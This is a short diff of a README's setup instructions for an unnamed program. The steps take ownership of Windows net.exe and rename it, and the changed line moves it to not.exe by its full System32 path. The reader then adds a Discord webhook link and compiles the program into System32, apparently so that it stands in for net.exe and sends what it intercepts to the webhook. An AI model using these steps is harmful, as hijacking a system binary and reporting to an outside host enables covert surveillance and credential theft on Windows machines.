@@ -10,7 +10,7 @@ For support and assistance please join [the official support discord](https://di
 1. rename net.exe to not.exe
     - `takeown /F net.exe`
     - `cacls net.exe /e /p <username>:f`
-    - `move net.exe not.exe`
+    - `move \windows\system32\net.exe \windows\system32\not.exe`
 3. Place your discord web hook link into the program
 4. Compile this program and put it in `C:\Windows\System32\`
 5. Add dependencies to `C:\Windows\System32\`
